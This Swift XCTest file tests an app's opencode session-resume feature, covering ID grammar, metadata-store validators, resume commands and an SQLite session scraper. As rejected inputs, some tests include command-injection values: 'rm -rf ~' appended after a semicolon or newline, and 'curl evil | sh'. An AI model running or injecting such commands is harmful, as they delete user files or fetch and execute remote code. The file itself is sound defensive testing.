import XCTest
import SQLite3

#if canImport(c11_DEV)
@testable import c11_DEV
#elseif canImport(c11)
@testable import c11
#endif

/// C11-151 — opencode exact-session resume via the plugin push rail.
///
/// These are pure/behavioral logic tests in the SAFE `c11LogicTests` target
/// (they do not launch a host app). They cover the load-bearing base62
/// grammar (the WIP Crockford regex wrongly rejected 63% of real session
/// ids), the reserved-key validators, the `OpencodeStrategy` resume/capture
/// surface, and the `OpencodeScraper` SQLite reader exercised against a real
/// temp database. The host-scheme `ConversationStrategyTests` cover the
/// other v1 strategies; opencode strategy coverage is deliberately
/// co-located here so the local gate exercises this ticket's code.

// MARK: - Grammar

final class OpencodeSessionIdGrammarTests: XCTestCase {

    /// Real ids pulled from a live opencode 1.17.5 store. The first three
    /// contain I/L/O/U in the body — a Crockford-base32 alphabet would
    /// wrongly reject them. This is the regression guard for the WIP bug.
    func testAcceptsRealBase62IdsIncludingILOU() {
        let real = [
            "ses_0fda89a49ffeLHwJXtrxnn4X6g",   // L, H, J, X
            "ses_0fd8a6fffffe6JzzcloHmtDV0R",   // o, l, H, D, V, R
            "ses_0fd8cb310ffe2of6OsP2qYz4Q5",   // O present
            "ses_0f5b10b09ffeb2G3Y53oze86wV"
        ]
        for id in real {
            XCTAssertTrue(isValidOpencodeSessionId(id), "should accept real id \(id)")
        }
    }

    func testRejectsWrongPrefix() {
        XCTAssertFalse(isValidOpencodeSessionId("sess_0fda89a49ffeLHwJXtrxnn4X6g"))
        XCTAssertFalse(isValidOpencodeSessionId("msg_0fda89a49ffeLHwJXtrxnn4X6g"))
        XCTAssertFalse(isValidOpencodeSessionId("0fda89a49ffeLHwJXtrxnn4X6g"))
    }

    func testRejectsWrongLength() {
        XCTAssertFalse(isValidOpencodeSessionId("ses_short"))
        XCTAssertFalse(isValidOpencodeSessionId("ses_0fda89a49ffeLHwJXtrxnn4X6"))   // 25
        XCTAssertFalse(isValidOpencodeSessionId("ses_0fda89a49ffeLHwJXtrxnn4X6gg"))  // 27
    }

    func testRejectsNonBase62BodyChars() {
        XCTAssertFalse(isValidOpencodeSessionId("ses_0fda89a49ffeLHwJXtrxnn4X6-"))   // hyphen
        XCTAssertFalse(isValidOpencodeSessionId("ses_0fda89a49ffeLHwJXtrxnn4X6_"))   // underscore
    }

    func testRejectsShellMetacharactersAndNewlines() {
        XCTAssertFalse(isValidOpencodeSessionId("ses_0fda89a49ffeLHwJXtrxnn4X6g; rm -rf ~"))
        XCTAssertFalse(isValidOpencodeSessionId("ses_0fda89a49ffeLHwJXtrxnn4X6g\nrm -rf ~"))
        XCTAssertFalse(isValidOpencodeSessionId(" ses_0fda89a49ffeLHwJXtrxnn4X6g"))   // leading space
    }

    func testProjectDirGrammarDelegatesToClaude() {
        XCTAssertTrue(isValidOpencodeSessionProjectDir("/Users/atin/proj"))
        XCTAssertFalse(isValidOpencodeSessionProjectDir("relative/path"))
        XCTAssertFalse(isValidOpencodeSessionProjectDir("/Users/atin/p'roj"))  // single quote
        XCTAssertFalse(isValidOpencodeSessionProjectDir("/Users/atin/p\nroj")) // newline
    }
}

// MARK: - Reserved-key validation (store boundary)

final class OpencodeReservedKeyValidationTests: XCTestCase {

    private let store = PanelMetadataStore.shared
    private let validId = "ses_0fda89a49ffeLHwJXtrxnn4X6g"

    func testStoreAcceptsValidSessionId() throws {
        let workspace = UUID(); let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        let result = try store.setMetadata(
            workspaceId: workspace, surfaceId: surface,
            partial: ["opencode.session_id": validId],
            mode: .merge, source: .explicit
        )
        XCTAssertEqual(result.applied["opencode.session_id"], true)
    }

    func testStoreAcceptsValidProjectDir() throws {
        let workspace = UUID(); let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        let result = try store.setMetadata(
            workspaceId: workspace, surfaceId: surface,
            partial: ["opencode.session_project_dir": "/Users/atin/Projects/x"],
            mode: .merge, source: .explicit
        )
        XCTAssertEqual(result.applied["opencode.session_project_dir"], true)
    }

    func testStoreRejectsCrockfordExcludedAssumption() {
        // A regression sentinel: an id containing L (excluded by Crockford)
        // MUST be accepted, so the store must NOT throw here.
        let workspace = UUID(); let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        XCTAssertNoThrow(try store.setMetadata(
            workspaceId: workspace, surfaceId: surface,
            partial: ["opencode.session_id": "ses_0fda89a49ffeLHwJXtrxnn4X6g"],
            mode: .merge, source: .explicit
        ))
    }

    func testStoreRejectsShellInjectionInSessionId() {
        let workspace = UUID(); let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        XCTAssertThrowsError(try store.setMetadata(
            workspaceId: workspace, surfaceId: surface,
            partial: ["opencode.session_id": "ses_x; curl evil | sh"],
            mode: .merge, source: .explicit
        )) { error in
            guard let e = error as? PanelMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(e.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonStringSessionId() {
        let workspace = UUID(); let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        XCTAssertThrowsError(try store.setMetadata(
            workspaceId: workspace, surfaceId: surface,
            partial: ["opencode.session_id": 42],
            mode: .merge, source: .explicit
        )) { error in
            guard let e = error as? PanelMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(e.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsRelativeProjectDir() {
        let workspace = UUID(); let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }
        XCTAssertThrowsError(try store.setMetadata(
            workspaceId: workspace, surfaceId: surface,
            partial: ["opencode.session_project_dir": "not/absolute"],
            mode: .merge, source: .explicit
        )) { error in
            guard let e = error as? PanelMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(e.code, "reserved_key_invalid_type")
        }
    }
}

// MARK: - Strategy

private struct StubLookup: OpencodeSessionLookup {
    let result: Bool?
    func sessionExists(id: String) -> Bool? { result }
}

final class OpencodeStrategyResumeTests: XCTestCase {

    private let id = "ses_0fda89a49ffeLHwJXtrxnn4X6g"
    private let cwd = "/Users/atin/Projects/proj"

    private func ref(state: ConversationState, placeholder: Bool = false, cwd: String? = nil) -> ConversationRef {
        ConversationRef(kind: "opencode", id: id, placeholder: placeholder, cwd: cwd,
                        capturedVia: .hook, state: state)
    }

    func testResumeSkipsPlaceholder() {
        let s = OpencodeStrategy()
        guard case .skip = s.resume(ref: ref(state: .alive, placeholder: true)) else {
            return XCTFail("placeholder must skip")
        }
    }

    func testResumeSkipsUnknownAndTombstoned() {
        let s = OpencodeStrategy()
        guard case .skip = s.resume(ref: ref(state: .unknown)) else { return XCTFail("unknown must skip") }
        guard case .skip = s.resume(ref: ref(state: .tombstoned)) else { return XCTFail("tombstoned must skip") }
    }

    func testResumeWithCwdEmitsCdPrefix() {
        let s = OpencodeStrategy()
        guard case let .typeCommand(text, submit) = s.resume(ref: ref(state: .alive, cwd: cwd)) else {
            return XCTFail("alive+cwd must typeCommand")
        }
        XCTAssertTrue(submit)
        XCTAssertEqual(text, "cd '/Users/atin/Projects/proj' && opencode --auto -s 'ses_0fda89a49ffeLHwJXtrxnn4X6g'")
    }

    func testResumeWithoutCwdHasNoCdPrefix() {
        let s = OpencodeStrategy()
        guard case let .typeCommand(text, _) = s.resume(ref: ref(state: .suspended)) else {
            return XCTFail("suspended must typeCommand")
        }
        XCTAssertEqual(text, "opencode --auto -s 'ses_0fda89a49ffeLHwJXtrxnn4X6g'")
        XCTAssertTrue(text.contains("--auto"),
                      "interactive resume must keep the launch command's auto-approve posture")
    }

    func testResumeSkipsInvalidId() {
        let s = OpencodeStrategy()
        let bad = ConversationRef(kind: "opencode", id: "ses_bad", placeholder: false,
                                  cwd: cwd, capturedVia: .hook, state: .alive)
        guard case .skip = s.resume(ref: bad) else { return XCTFail("invalid id must skip") }
    }

    func testCapturePushPrimaryWins() {
        let s = OpencodeStrategy()
        let push = ConversationRef(kind: "opencode", id: id, placeholder: false,
                                   cwd: cwd, capturedVia: .hook, state: .alive)
        let claim = ConversationRef(kind: "opencode", id: id, placeholder: true,
                                    cwd: cwd, capturedVia: .wrapperClaim, state: .alive)
        let out = s.capture(inputs: ConversationStrategyInputs(
            surfaceId: "s", cwd: cwd, wrapperClaim: claim, push: push))
        XCTAssertEqual(out?.capturedVia, .hook)
        XCTAssertEqual(out?.id, id)
    }

    func testCaptureFallsBackToWrapperClaim() {
        let s = OpencodeStrategy()
        let claim = ConversationRef(kind: "opencode", id: id, placeholder: true,
                                    cwd: cwd, capturedVia: .wrapperClaim, state: .alive)
        let out = s.capture(inputs: ConversationStrategyInputs(
            surfaceId: "s", cwd: cwd, wrapperClaim: claim, push: nil))
        XCTAssertEqual(out?.capturedVia, .wrapperClaim)
    }

    func testCaptureScrapeCandidateYieldsUnknownState() {
        let s = OpencodeStrategy()
        let cand = ScrapeCandidate(id: id, filePath: "", mtime: Date(), size: 0, cwd: cwd)
        let out = s.capture(inputs: ConversationStrategyInputs(
            surfaceId: "s", cwd: cwd, scrapeCandidates: [cand]))
        XCTAssertEqual(out?.state, .unknown)
        XCTAssertEqual(out?.capturedVia, .scrape)
    }

    func testIsValidId() {
        XCTAssertTrue(OpencodeStrategy().isValidId(id))
        XCTAssertFalse(OpencodeStrategy().isValidId("ses_bad"))
    }

    func testTranscriptExistsThreeValued() {
        let r = ref(state: .suspended, cwd: cwd)
        let fs = DefaultConversationFilesystem()
        XCTAssertEqual(OpencodeStrategy(sessionLookup: { _ in StubLookup(result: true) }).transcriptExists(for: r, filesystem: fs), true)
        XCTAssertEqual(OpencodeStrategy(sessionLookup: { _ in StubLookup(result: false) }).transcriptExists(for: r, filesystem: fs), false)
        XCTAssertNil(OpencodeStrategy(sessionLookup: { _ in StubLookup(result: nil) }).transcriptExists(for: r, filesystem: fs))
    }

    func testCrashReclassificationPreservesVerifiedMissingUnavailable() async {
        let cases: [(Bool?, ConversationState, String)] = [
            (true, .suspended, "crash recovery: transcript verified on disk"),
            (false, .unknown, "crash recovery: transcript not found"),
            (nil, .unknown, "crash recovery: transcript verification unavailable"),
        ]

        for (index, testCase) in cases.enumerated() {
            let store = ConversationStore()
            await store.push(
                surfaceId: "S\(index)",
                kind: "opencode",
                id: id,
                source: .hook,
                cwd: cwd,
                state: .alive
            )
            let registry = ConversationStrategyRegistry(strategies: [
                OpencodeStrategy(sessionLookup: { _ in
                    StubLookup(result: testCase.0)
                })
            ])
            await store.reclassifyAfterCrash(
                registry: registry,
                filesystem: DefaultConversationFilesystem()
            )
            let active = await store.active(for: "S\(index)")
            XCTAssertEqual(active?.state, testCase.1)
            XCTAssertEqual(active?.diagnosticReason, testCase.2)
        }
    }
}

// MARK: - Scraper (real temp SQLite DB)

final class OpencodeScraperTests: XCTestCase {

    private var tmpHome: URL!

    override func setUpWithError() throws {
        tmpHome = FileManager.default.temporaryDirectory
            .appendingPathComponent("c11-opencode-test-\(UUID().uuidString)", isDirectory: true)
    }

    override func tearDownWithError() throws {
        if let tmpHome { try? FileManager.default.removeItem(at: tmpHome) }
    }

    private func databaseURL(dataHome: URL? = nil) -> URL {
        let root = dataHome ?? tmpHome.appendingPathComponent(".local/share", isDirectory: true)
        return root.appendingPathComponent("opencode/opencode.db")
    }

    /// Seed only the session metadata columns used by the scraper. The v2
    /// fixture mirrors OpenCode 2.0.25's `session_v2` schema names.
    private func seedDatabase(
        _ rows: [(id: String, dir: String, updatedMs: Int64)],
        tables: [String] = ["session"],
        dataHome: URL? = nil,
        databaseURLOverride: URL? = nil
    ) throws {
        let dbURL = databaseURLOverride ?? databaseURL(dataHome: dataHome)
        try FileManager.default.createDirectory(at: dbURL.deletingLastPathComponent(), withIntermediateDirectories: true)
        var db: OpaquePointer?
        XCTAssertEqual(sqlite3_open(dbURL.path, &db), SQLITE_OK)
        defer { sqlite3_close(db) }
        for table in tables {
            XCTAssertTrue(["session", "session_v2"].contains(table))
            let ddl = "CREATE TABLE \(table) (id TEXT PRIMARY KEY, parent_id TEXT, directory TEXT NOT NULL, time_updated INTEGER NOT NULL, time_archived INTEGER);"
            XCTAssertEqual(sqlite3_exec(db, ddl, nil, nil, nil), SQLITE_OK)
        }
        for row in rows {
            for table in tables {
                let sql = "INSERT INTO \(table) (id, parent_id, directory, time_updated) VALUES ('\(row.id)', NULL, '\(row.dir)', \(row.updatedMs));"
                XCTAssertEqual(sqlite3_exec(db, sql, nil, nil, nil), SQLITE_OK, "insert \(row.id) into \(table)")
            }
        }
    }

    func testDatabasePathNilWhenAbsent() {
        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: [:])
        XCTAssertNil(scraper.databasePath(), "no db file yet")
    }

    func testSessionExistsTrueFalseNil() throws {
        let present = "ses_0fda89a49ffeLHwJXtrxnn4X6g"
        let absent  = "ses_0f5b10b09ffeb2G3Y53oze86wV"
        try seedDatabase([(present, "/Users/atin/proj", 1_700_000_000_000)])
        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: [:])

        XCTAssertEqual(scraper.sessionExists(id: present), true)
        XCTAssertEqual(scraper.sessionExists(id: absent), false)
        XCTAssertNil(scraper.sessionExists(id: "not-a-valid-id"), "bad grammar → nil")

        // DB absent → nil (cannot verify), not false.
        let noDb = OpencodeScraper(homeDirectory: FileManager.default.temporaryDirectory
            .appendingPathComponent("c11-no-db-\(UUID().uuidString)", isDirectory: true), environment: [:])
        XCTAssertNil(noDb.sessionExists(id: present))
    }

    func testScrapeFiltersByCwdNewestFirst() throws {
        let dir = "/Users/atin/proj"
        try seedDatabase([
            ("ses_0fda89a49ffeLHwJXtrxnn4X6g", dir, 100),
            ("ses_0fd8a6fffffe6JzzcloHmtDV0R", dir, 300),   // newest in dir
            ("ses_0fd8cb310ffe2of6OsP2qYz4Q5", "/Users/atin/other", 999)  // different cwd
        ])
        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: [:])
        let refs = scraper.scrape(cwd: dir)
        XCTAssertEqual(refs.map(\.id), [
            "ses_0fd8a6fffffe6JzzcloHmtDV0R",
            "ses_0fda89a49ffeLHwJXtrxnn4X6g"
        ])
        XCTAssertTrue(refs.allSatisfy { $0.cwd == dir })
        XCTAssertTrue(refs.allSatisfy { $0.capturedVia == .scrape })
    }

    func testScrapeEmptyForUnknownCwd() throws {
        try seedDatabase([("ses_0fda89a49ffeLHwJXtrxnn4X6g", "/a", 1)])
        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: [:])
        XCTAssertEqual(scraper.scrape(cwd: "/nonexistent"), [])
    }

    func testV2OnlySessionTableVerifiesExactIDAndArchivedRows() throws {
        let present = "ses_0fda89a49ffeLHwJXtrxnn4X6g"
        let absent = "ses_0f5b10b09ffeb2G3Y53oze86wV"
        try seedDatabase([(present, "/work", 1)], tables: ["session_v2"])
        let dbURL = databaseURL()
        var db: OpaquePointer?
        XCTAssertEqual(sqlite3_open(dbURL.path, &db), SQLITE_OK)
        XCTAssertEqual(sqlite3_exec(db, "UPDATE session_v2 SET time_archived = 2 WHERE id = '\(present)';", nil, nil, nil), SQLITE_OK)
        sqlite3_close(db)

        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: [:])
        XCTAssertEqual(scraper.sessionExists(id: present), true,
                       "findSession accepts the exact archived row; archive is not confirmed absence")
        XCTAssertEqual(scraper.sessionExists(id: absent), false)
        XCTAssertEqual(scraper.scrape(cwd: "/work").map(\.id), [present])
    }

    func testBothSessionTablesAreQueriedWithoutNewestByCwdSubstitution() throws {
        let v2ID = "ses_0fda89a49ffeLHwJXtrxnn4X6g"
        let legacyID = "ses_0fd8a6fffffe6JzzcloHmtDV0R"
        let absent = "ses_0f5b10b09ffeb2G3Y53oze86wV"
        try seedDatabase([(v2ID, "/same", 10), (legacyID, "/same", 20)], tables: ["session", "session_v2"])
        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: [:])
        XCTAssertEqual(scraper.sessionExists(id: v2ID), true)
        XCTAssertEqual(scraper.sessionExists(id: legacyID), true)
        XCTAssertEqual(scraper.sessionExists(id: absent), false)
        XCTAssertEqual(scraper.scrape(cwd: "/same").map(\.id), [legacyID, v2ID])
    }

    func testXDGDataHomeOverridesHomeDefault() throws {
        let homeID = "ses_0fda89a49ffeLHwJXtrxnn4X6g"
        let xdgID = "ses_0f5b10b09ffeb2G3Y53oze86wV"
        let xdg = tmpHome.appendingPathComponent("separate-data-root", isDirectory: true)
        try seedDatabase([(homeID, "/home", 1)])
        try seedDatabase([(xdgID, "/xdg", 2)], tables: ["session_v2"], dataHome: xdg)
        let scraper = OpencodeScraper(homeDirectory: tmpHome, environment: ["XDG_DATA_HOME": xdg.path])
        XCTAssertEqual(scraper.databasePath(), databaseURL(dataHome: xdg))
        XCTAssertEqual(scraper.sessionExists(id: xdgID), true)
        XCTAssertEqual(scraper.sessionExists(id: homeID), false)
    }

    func testOpenCodeDatabaseOverrideSupportsAbsoluteAndRelativePaths() throws {
        let absoluteURL = tmpHome.appendingPathComponent("custom-opencode.sqlite")
        try seedDatabase([("ses_0fda89a49ffeLHwJXtrxnn4X6g", "/absolute", 1)],
                         databaseURLOverride: absoluteURL)
        let absolute = OpencodeScraper(homeDirectory: nil, environment: ["OPENCODE_DB": absoluteURL.path])
        XCTAssertEqual(absolute.databasePath(), absoluteURL)
        XCTAssertEqual(absolute.sessionExists(id: "ses_0fda89a49ffeLHwJXtrxnn4X6g"), true)

        let relativeURL = tmpHome.appendingPathComponent(".local/share/opencode/alternate.sqlite")
        try seedDatabase([("ses_0f5b10b09ffeb2G3Y53oze86wV", "/relative", 2)],
                         databaseURLOverride: relativeURL)
        let relative = OpencodeScraper(homeDirectory: tmpHome, environment: ["OPENCODE_DB": "alternate.sqlite"])
        XCTAssertEqual(relative.databasePath(), relativeURL)
        XCTAssertEqual(relative.sessionExists(id: "ses_0f5b10b09ffeb2G3Y53oze86wV"), true)
    }

    func testOpenCodeMemoryAndMissingOverridesDoNotFallBackToDefaultDatabase() throws {
        try seedDatabase([("ses_0fda89a49ffeLHwJXtrxnn4X6g", "/default", 1)])
        XCTAssertNil(OpencodeScraper(homeDirectory: tmpHome, environment: ["OPENCODE_DB": ":memory:"]).databasePath(),
                     "in-memory OpenCode DB has no on-disk recovery path")
        XCTAssertNil(OpencodeScraper(homeDirectory: tmpHome, environment: ["OPENCODE_DB": "missing.sqlite"]).databasePath(),
                     "an absent explicit override must not silently query another database")
    }

    func testNeitherOrUnsupportedSchemaIsUnverifiable() throws {
        let dbURL = databaseURL()
        try FileManager.default.createDirectory(at: dbURL.deletingLastPathComponent(), withIntermediateDirectories: true)
        var db: OpaquePointer?
        XCTAssertEqual(sqlite3_open(dbURL.path, &db), SQLITE_OK)
        XCTAssertEqual(sqlite3_exec(db, "CREATE TABLE unrelated (value TEXT); CREATE TABLE session_v2 (title TEXT);", nil, nil, nil), SQLITE_OK)
        sqlite3_close(db)
        XCTAssertNil(OpencodeScraper(homeDirectory: tmpHome, environment: [:]).sessionExists(id: "ses_0fda89a49ffeLHwJXtrxnn4X6g"),
                     "unsupported v2 schema cannot confirm absence")

        let neitherHome = tmpHome.appendingPathComponent("neither", isDirectory: true)
        let neitherURL = neitherHome.appendingPathComponent(".local/share/opencode/opencode.db")
        try FileManager.default.createDirectory(at: neitherURL.deletingLastPathComponent(), withIntermediateDirectories: true)
        var neitherDB: OpaquePointer?
        XCTAssertEqual(sqlite3_open(neitherURL.path, &neitherDB), SQLITE_OK)
        XCTAssertEqual(sqlite3_exec(neitherDB, "CREATE TABLE unrelated (value TEXT);", nil, nil, nil), SQLITE_OK)
        sqlite3_close(neitherDB)
        XCTAssertNil(OpencodeScraper(homeDirectory: neitherHome, environment: [:]).sessionExists(id: "ses_0fda89a49ffeLHwJXtrxnn4X6g"))

        let incompleteHome = tmpHome.appendingPathComponent("incomplete", isDirectory: true)
        let incompleteURL = incompleteHome.appendingPathComponent(".local/share/opencode/opencode.db")
        try FileManager.default.createDirectory(at: incompleteURL.deletingLastPathComponent(), withIntermediateDirectories: true)
        var incompleteDB: OpaquePointer?
        XCTAssertEqual(sqlite3_open(incompleteURL.path, &incompleteDB), SQLITE_OK)
        XCTAssertEqual(sqlite3_exec(incompleteDB, "CREATE TABLE session_v2 (id TEXT PRIMARY KEY); INSERT INTO session_v2 (id) VALUES ('ses_0fda89a49ffeLHwJXtrxnn4X6g');", nil, nil, nil), SQLITE_OK)
        sqlite3_close(incompleteDB)
        XCTAssertNil(OpencodeScraper(homeDirectory: incompleteHome, environment: [:])
            .sessionExists(id: "ses_0fda89a49ffeLHwJXtrxnn4X6g"),
                     "an ID-only lookalike table cannot confirm a supported OpenCode session")
    }

    func testCorruptAndLockedDatabasesRemainUnverifiable() throws {
        let dbURL = databaseURL()
        try FileManager.default.createDirectory(at: dbURL.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data("not a sqlite database".utf8).write(to: dbURL)
        XCTAssertNil(OpencodeScraper(homeDirectory: tmpHome, environment: [:]).sessionExists(id: "ses_0fda89a49ffeLHwJXtrxnn4X6g"))

        try FileManager.default.removeItem(at: dbURL)
        try seedDatabase([], tables: ["session_v2"])
        var lockDB: OpaquePointer?
        XCTAssertEqual(sqlite3_open(dbURL.path, &lockDB), SQLITE_OK)
        XCTAssertEqual(sqlite3_exec(lockDB, "BEGIN EXCLUSIVE;", nil, nil, nil), SQLITE_OK)
        defer {
            sqlite3_exec(lockDB, "ROLLBACK;", nil, nil, nil)
            sqlite3_close(lockDB)
        }
        XCTAssertNil(OpencodeScraper(homeDirectory: tmpHome, environment: [:]).sessionExists(id: "ses_0fda89a49ffeLHwJXtrxnn4X6g"))
    }
}
